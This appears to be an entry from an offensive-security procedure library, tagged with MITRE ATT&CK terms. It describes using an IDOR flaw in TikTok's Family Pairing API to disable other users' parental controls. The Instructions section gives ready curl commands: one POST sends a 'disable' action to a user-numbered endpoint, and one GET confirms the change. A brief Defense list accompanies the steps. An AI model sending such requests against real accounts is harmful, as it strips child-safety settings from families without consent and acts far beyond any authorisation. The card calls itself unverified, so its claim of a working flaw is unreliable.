---
id: 123e4567-e89b-12d3-a456-426614174003
name: Disable-User-Features-via-IDOR
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:48.408Z'
tactics:
  - '[[Discovery]]'
techniques:
  - '[[Account Discovery]]'
sub_techniques: []
tags:
  - idor
  - api
  - disruption
commands:
  - '[[commands/curl-disable-feature]]'
platforms:
  - Web
  - API
tools:
  - '[[tools/Burp-Suite]]'
skill_level: intermediate
impact_level: high
detection_risk: high
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Account Discovery]]'
---

# Disable-User-Features-via-IDOR

## Summary

This procedure exploits confirmed IDOR in TikTok's Family Pairing API to send disable commands, disrupting other users' account features like parental controls.

## Description

With unauthorized access established, attackers issue API calls to disable features by targeting vulnerable endpoints. This leads to high-impact privacy violations, as victims lose functionality without consent. The attack relies on the same direct reference flaws, amplifying discovery into disruption.

## Requirements

1. Confirmed IDOR access from prior procedure.
2. Target user ID and feature names (e.g., from API docs or testing).
3. Auth token with sufficient privileges.
4. Tool for crafting POST requests.

## Defense

Defensive measures and detection strategies:

- Require explicit confirmation for feature changes.
- Implement audit logs for all pairing modifications.
- Use CAPTCHA or secondary auth for sensitive actions.

## Objectives

1. Disable target user's family pairing features.
2. Verify impact on account functionality.
3. Demonstrate high-severity privacy breach.

## Instructions

### Step 1: Craft Disable Request

**Context**: Send a POST with disable action to the vulnerable endpoint.

**Command** ([[commands/curl-disable-feature]]):
```bash
curl -X POST 'https://api.tiktok.com/v1/family/pair/123456789' -H 'Authorization: Bearer YOUR_TOKEN' -d '{"action":"disable", "feature":"parental_control"}'
```

> Success: 200 OK with {"status":"disabled"}.

### Step 2: Confirm Disablement

**Context**: Query the endpoint to validate the change.

**Command** ([[commands/curl-disable-feature]]):
```bash
curl -X GET 'https://api.tiktok.com/v1/family/pair/123456789' -H 'Authorization: Bearer YOUR_TOKEN'
```

> Expected output shows disabled status.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]]

### Techniques

- [[Account Discovery]]

### Sub-Techniques


## Commands Used

- [[commands/curl-disable-feature]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[idor]]
- [[api]]
- [[disruption]]
